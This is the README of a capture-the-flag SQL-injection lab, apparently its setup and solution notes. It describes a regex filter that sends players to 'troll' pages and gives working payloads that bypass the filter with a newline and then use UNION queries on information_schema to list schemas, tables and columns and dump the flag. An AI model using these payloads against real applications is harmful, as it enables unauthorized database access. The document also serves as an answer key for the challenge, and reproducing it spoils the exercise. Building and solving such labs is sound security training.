## run the containers

```docker-compose up```

## exploit sqli

visit http://127.0.0.1:8080 in your browser and try to exploit the sqli with the "search functionality". If you use a brower, check the sites source after the response is received.

to "troll" the CTF players, there is a detection of possible injection attempts with a regex, which e.g. detects a "\'" and redirects the players to a random choice of 10 "troll" sites (see the "static" folder).

one possibility to get the flag (as of now, you have to break the regex by using a "\n"):

possible injection to display all products:

 ```\n%' or 'a'='a'; #```

how to get database names:

```\n%' or 'a'='a' union select group_concat(schema_name) from information_schema.schemata; #```

how to get table names:

```\n%' or 'a'='a' union select group_concat(table_name) from information_schema.tables where table_schema='flask'; #```

get column names of table 'flag':

```\n%' or 'a'='a' union select group_concat(column_name) from information_schema.columns where table_name='flag'; #```

get flag itself:

```\n%' or 'a'='a' union select group_concat(flag) from flask.flag; #```